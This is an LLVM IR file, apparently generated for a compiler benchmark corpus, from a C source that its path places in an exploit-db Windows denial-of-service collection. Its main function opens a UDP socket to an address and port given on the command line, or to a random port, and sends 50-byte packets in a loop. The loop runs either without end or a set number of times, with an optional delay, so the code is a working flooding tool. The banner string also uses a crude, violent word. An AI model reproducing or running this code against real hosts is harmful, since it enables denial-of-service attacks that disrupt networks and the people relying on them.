; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_345.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_345.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@elapsed = common dso_local global i64 0, align 8
@stats = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [37 x i8] c"Port must be over 1 and under 65535\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_DGRAM = common dso_local global i32 0, align 4
@IPPROTO_UDP = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [27 x i8] c"raped2.c by cys of NewNet\0A\00", align 1
@.str.2 = private unnamed_addr constant [28 x i8] c"ip:%s x:0 port:%d delay:%d\0A\00", align 1
@shit = common dso_local global i32 0, align 4
@sendcount = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [29 x i8] c"ip:%s x:%d port:%d delay:%d\0A\00", align 1
@.str.4 = private unnamed_addr constant [12 x i8] c"Exiting...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = call i64 @time(i32* null)
  store i64 %12, i64* @elapsed, align 8
  store i32 1, i32* %11, align 4
  br label %13

13:                                               ; preds = %20, %2
  %14 = load i32, i32* %11, align 4
  %15 = icmp slt i32 %14, 32
  br i1 %15, label %16, label %23

16:                                               ; preds = %13
  %17 = load i32, i32* %11, align 4
  %18 = load i32, i32* @stats, align 4
  %19 = call i32 @signal(i32 %17, i32 %18)
  br label %20

20:                                               ; preds = %16
  %21 = load i32, i32* %11, align 4
  %22 = add nsw i32 %21, 1
  store i32 %22, i32* %11, align 4
  br label %13

23:                                               ; preds = %13
  %24 = load i32, i32* %4, align 4
  %25 = icmp slt i32 %24, 5
  br i1 %25, label %26, label %31

26:                                               ; preds = %23
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = call i32 @usage(i8* %29)
  br label %31

31:                                               ; preds = %26, %23
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 2
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @atoi(i8* %34)
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %37, label %42

37:                                               ; preds = %31
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 2
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @atoi(i8* %40)
  store i32 %41, i32* %8, align 4
  br label %43

42:                                               ; preds = %31
  store i32 0, i32* %8, align 4
  br label %43

43:                                               ; preds = %42, %37
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 3
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @atoi(i8* %46)
  %48 = icmp eq i32 %47, 0
  br i1 %48, label %49, label %55

49:                                               ; preds = %43
  %50 = call i64 @time(i32* null)
  %51 = trunc i64 %50 to i32
  %52 = call i32 @srand(i32 %51)
  %53 = call i32 (...) @rand()
  %54 = srem i32 %53, 65535
  store i32 %54, i32* %7, align 4
  br label %76

55:                                               ; preds = %43
  %56 = load i8**, i8*** %5, align 8
  %57 = getelementptr inbounds i8*, i8** %56, i64 3
  %58 = load i8*, i8** %57, align 8
  %59 = call i32 @atoi(i8* %58)
  %60 = icmp slt i32 %59, 1
  br i1 %60, label %67, label %61

61:                                               ; preds = %55
  %62 = load i8**, i8*** %5, align 8
  %63 = getelementptr inbounds i8*, i8** %62, i64 3
  %64 = load i8*, i8** %63, align 8
  %65 = call i32 @atoi(i8* %64)
  %66 = icmp sgt i32 %65, 65535
  br i1 %66, label %67, label %70

67:                                               ; preds = %61, %55
  %68 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str, i64 0, i64 0))
  %69 = call i32 @exit(i32 -1) #3
  unreachable

70:                                               ; preds = %61
  %71 = load i8**, i8*** %5, align 8
  %72 = getelementptr inbounds i8*, i8** %71, i64 3
  %73 = load i8*, i8** %72, align 8
  %74 = call i32 @atoi(i8* %73)
  store i32 %74, i32* %7, align 4
  br label %75

75:                                               ; preds = %70
  br label %76

76:                                               ; preds = %75, %49
  %77 = load i32, i32* @AF_INET, align 4
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  store i32 %77, i32* %78, align 4
  %79 = load i8**, i8*** %5, align 8
  %80 = getelementptr inbounds i8*, i8** %79, i64 1
  %81 = load i8*, i8** %80, align 8
  %82 = call i32 @inet_addr(i8* %81)
  %83 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  %84 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %83, i32 0, i32 0
  store i32 %82, i32* %84, align 4
  %85 = load i32, i32* %7, align 4
  %86 = call i32 @htons(i32 %85)
  %87 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i32 %86, i32* %87, align 4
  %88 = load i32, i32* @AF_INET, align 4
  %89 = load i32, i32* @SOCK_DGRAM, align 4
  %90 = load i32, i32* @IPPROTO_UDP, align 4
  %91 = call i32 @socket(i32 %88, i32 %89, i32 %90)
  store i32 %91, i32* %10, align 4
  %92 = load i32, i32* %10, align 4
  %93 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %94 = call i32 @connect(i32 %92, %struct.sockaddr* %93, i32 12)
  %95 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0))
  %96 = load i32, i32* %8, align 4
  %97 = icmp eq i32 %96, 0
  br i1 %97, label %98, label %126

98:                                               ; preds = %76
  %99 = load i8**, i8*** %5, align 8
  %100 = getelementptr inbounds i8*, i8** %99, i64 1
  %101 = load i8*, i8** %100, align 8
  %102 = load i32, i32* %7, align 4
  %103 = load i8**, i8*** %5, align 8
  %104 = getelementptr inbounds i8*, i8** %103, i64 4
  %105 = load i8*, i8** %104, align 8
  %106 = call i32 @atoi(i8* %105)
  %107 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.2, i64 0, i64 0), i8* %101, i32 %102, i32 %106)
  br label %108

108:                                              ; preds = %125, %98
  %109 = load i32, i32* %10, align 4
  %110 = load i32, i32* @shit, align 4
  %111 = call i32 @send(i32 %109, i32 %110, i32 50, i32 0)
  %112 = load i32, i32* @sendcount, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* @sendcount, align 4
  %114 = load i8**, i8*** %5, align 8
  %115 = getelementptr inbounds i8*, i8** %114, i64 4
  %116 = load i8*, i8** %115, align 8
  %117 = call i32 @atoi(i8* %116)
  %118 = icmp ne i32 %117, 0
  br i1 %118, label %119, label %125

119:                                              ; preds = %108
  %120 = load i8**, i8*** %5, align 8
  %121 = getelementptr inbounds i8*, i8** %120, i64 4
  %122 = load i8*, i8** %121, align 8
  %123 = call i32 @atoi(i8* %122)
  %124 = call i32 @usleep(i32 %123)
  br label %125

125:                                              ; preds = %119, %108
  br label %108

126:                                              ; preds = %76
  %127 = load i8**, i8*** %5, align 8
  %128 = getelementptr inbounds i8*, i8** %127, i64 1
  %129 = load i8*, i8** %128, align 8
  %130 = load i32, i32* %8, align 4
  %131 = load i32, i32* %7, align 4
  %132 = load i8**, i8*** %5, align 8
  %133 = getelementptr inbounds i8*, i8** %132, i64 4
  %134 = load i8*, i8** %133, align 8
  %135 = call i32 @atoi(i8* %134)
  %136 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.3, i64 0, i64 0), i8* %129, i32 %130, i32 %131, i32 %135)
  store i32 0, i32* %9, align 4
  br label %137

137:                                              ; preds = %159, %126
  %138 = load i32, i32* %9, align 4
  %139 = load i32, i32* %8, align 4
  %140 = icmp slt i32 %138, %139
  br i1 %140, label %141, label %162

141:                                              ; preds = %137
  %142 = load i32, i32* %10, align 4
  %143 = load i32, i32* @shit, align 4
  %144 = call i32 @send(i32 %142, i32 %143, i32 50, i32 0)
  %145 = load i32, i32* @sendcount, align 4
  %146 = add nsw i32 %145, 1
  store i32 %146, i32* @sendcount, align 4
  %147 = load i8**, i8*** %5, align 8
  %148 = getelementptr inbounds i8*, i8** %147, i64 4
  %149 = load i8*, i8** %148, align 8
  %150 = call i32 @atoi(i8* %149)
  %151 = icmp ne i32 %150, 0
  br i1 %151, label %152, label %158

152:                                              ; preds = %141
  %153 = load i8**, i8*** %5, align 8
  %154 = getelementptr inbounds i8*, i8** %153, i64 4
  %155 = load i8*, i8** %154, align 8
  %156 = call i32 @atoi(i8* %155)
  %157 = call i32 @usleep(i32 %156)
  br label %158

158:                                              ; preds = %152, %141
  br label %159

159:                                              ; preds = %158
  %160 = load i32, i32* %9, align 4
  %161 = add nsw i32 %160, 1
  store i32 %161, i32* %9, align 4
  br label %137

162:                                              ; preds = %137
  br label %163

163:                                              ; preds = %162
  %164 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.4, i64 0, i64 0))
  %165 = load i32, i32* %3, align 4
  ret i32 %165
}

declare dso_local i64 @time(i32*) #1

declare dso_local i32 @signal(i32, i32) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @srand(i32) #1

declare dso_local i32 @rand(...) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @send(i32, i32, i32, i32) #1

declare dso_local i32 @usleep(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
